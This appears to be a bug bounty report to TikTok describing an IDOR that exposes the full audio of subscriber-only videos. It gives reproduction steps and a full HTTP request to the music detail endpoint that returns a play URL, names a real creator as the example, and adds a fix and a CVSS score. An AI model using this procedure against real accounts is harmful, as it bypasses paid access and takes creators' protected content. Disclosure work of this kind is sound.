**Program:** Tiktok  **Asset:** tiktok.com  **Weakness:** Information Disclosure

**Title:** IDOR on Audio Resource Allows Full Extraction of Subscriber-Only Content Audio via GraphQL

## Description:

TikTok allows creators to publish **subscriber-only videos**, where non-subscribers are limited to viewing only a short preview of the content. Full access to the video and its audio is intended to be restricted behind a paid subscription.

However, it is possible to extract the **full audio** of subscriber-only videos without subscribing by abusing a backend GraphQL endpoint.

During the preview flow, an attacker can obtain a **sound_id** associated with the subscriber-only video. This identifier can then be used in a GraphQL request to retrieve a response containing a **play URL**, which provides access to the **entire audio file**, bypassing the subscription restriction.

This demonstrates that the backend does **not enforce proper authorization checks** when serving protected audio resources.

## Context and Impact on Content Creators

For many TikTok creators, the primary value of subscriber-only content lies in the **audio**, especially for:
- Story-time content  
- Commentary and discussions  
- Exclusive announcements  
- Promo or discount codes  

In these cases, the message is delivered entirely through speech, meaning the full content can be understood without watching the video.  

For example, creators like https://www.tiktok.com/@cristinabruno1111/ produce content where the spoken narrative alone contains all the intended information.

---

## Steps to Reproduce
1. Find a content creator with sub only content for example lets use (https://www.tiktok.com/@cristinabruno1111/)

2. go to their page and tap the subscription button
<img width="1179" height="2556" alt="image (1)" src="https://github.com/user-attachments/assets/a60c406c-6df0-4630-9b0c-a390a8668276" />

3. Now click the list of sub only content
<img width="1179" height="2556" alt="image (2)" src="https://github.com/user-attachments/assets/360ff434-6224-48a7-8ff1-cca8d47b4c48" />

4. You will see the list of sub only content and also you will observe you can preview some of the videos for few seconds Now click one of the videos to preview it.
<img width="1179" height="2556" alt="image (3)" src="https://github.com/user-attachments/assets/8f4c0728-8e87-412e-8fda-e4921266892d" />

5. During the preview period (before the video becomes blurred), tap sound icon
<img width="1179" height="2556" alt="image (4)" src="https://github.com/user-attachments/assets/0f4bc057-5273-494f-a913-30c33a30184f" />

6. Tap the **Share** button on the previewed video and select **Copy Link**

7. Open the copied link on PC browser to access the **sound page** and then find/copy the **sound_id** on the page link as shown in the image below
 <img width="896" height="442" alt="Screenshot 2026-04-01 085637" src="https://github.com/user-attachments/assets/58c60464-3775-4adc-81d3-5aa3cf671442" />
8. Now send the request below (change `musicId` to the sound_id you copied earlier)
```
GET /api/music/detail/?WebIdLastTime=1770339744&aid=1988&app_language=en-GB&app_name=tiktok_web&browser_language=en-GB&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&data_collection_enabled=true&device_id=7603551270141756929&device_platform=web_pc&focus_state=true&from_page=music&history_len=2&is_fullscreen=false&is_page_visible=true&language=en-GB&musicId=SAVED_SOUND_ID&odinId=7603550436969546770&os=windows&priority_region=NG&referer=&region=NG&screen_height=720&screen_width=1280&tz_name=Africa%2FLagos&user_is_login=true&webcast_language=en-GB&msToken=y-YzR8rweqC3OFSARYCjfa6ybWerDxf_t6CM8Ovw5Nz7WBsu2AsD5xsazIb7nv3qph-9750F39IyChwmO5zptHmEQwwSYL1EiNShh_P4RbgBwusdvyvXsgANbBfiQSR3Cd2saT5-hOcrSgA=&X-Bogus=DFSzswVOmTtANaKACq7XPu6-55yq&X-Gnarly=M/nIE8oooLA8qvg9X6ozSqsqRHS/TTefjiDGC-i9igGVVe23lc/srPRR7TKGRAlf/c5/i3WtbAAwxxltkcc68vk-iTlcEyztOr9p7O2t8Q-yyxzJUx1qDxc5cvEaoYcwcdoyJOWhEAQcd57KgbTPlrgrJPKj0jkwBsMqWRjxgEjOz5LbaLBneRW6VjwpmCVCi5qL/voINJx5rWi0rBTw2tdWAJG2uuzmU90lOYgh5SnPMhPEFWB-8mesnhVwHVqvhT6TSnjJ6d0ZEg2LIyf3D3r-5PNKFQb-ieVXua04tkQWZy-ghbvCurefIG0qm-o9Yoz= HTTP/2
Host: www.tiktok.com
Cookie: [Redacted]
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.tiktok.com/music/original-sound-7585624351504911118?_d=secCgYIASAHKAESPgo8Qzqb4Zil%2BS9t5H1VHXG8kH%2FQ8NJyO705Tyu3PhAvdXk5SYRyg6T7jrFheNyhkjsJ2QqadyTLa2d2nXSeGgA%3D&_r=1&_svg=1&checksum=028edbe41707787b8794a78d49f303fceaa945bffbcabdbde713c9b22210886a&sec_user_id=MS4wLjABAAAA8_8gvJdSL33HOMUzfVZ37TQyrl7shHjZcpfx-cBOfvLiSIz-7UTmMilr9lxmZEtS&share_app_id=1233&share_link_id=4F8ADB96-834F-45E0-8320-8B8226C50570&share_music_id=7585624351504911118&share_region=NG&sharer_language=en&social_share_type=7&source=h5_m&timestamp=1774955902&tt_from=copy&u_code=f1m328hhe2kg85&ug_btm=b0%2Cb5171&user_id=7603550436969546770&utm_campaign=client_share&utm_medium=ios&utm_source=copy
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
9. Observe that the response contains a **play URL**
10.  Copy the `play URL` and open it in a browser, Observe that the **full audio of the subscriber-only video** is accessible without requiring a subscription

---

## Impact

The GraphQL endpoint does not validate whether a `sound_id` belongs to a subscriber-only video before returning the audio resource.

As a result, an attacker can retrieve the **full audio** of subscriber-only content without having an active subscription, bypassing the intended access restrictions.
## Recommendation

Ensure the GraphQL endpoint enforces proper authorization checks by verifying whether the requested `sound_id` is associated with subscriber-only content.

Access to the audio resource should only be granted if the requesting user has an active subscription or the necessary permissions.
---

## Severity
**CVSS v3.0 Base Score:** 5.9 → Medium  

| Metric | Value |
|--------|-------|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | Low |
| Integrity (I) | None |
| Availability (A) | None |

---
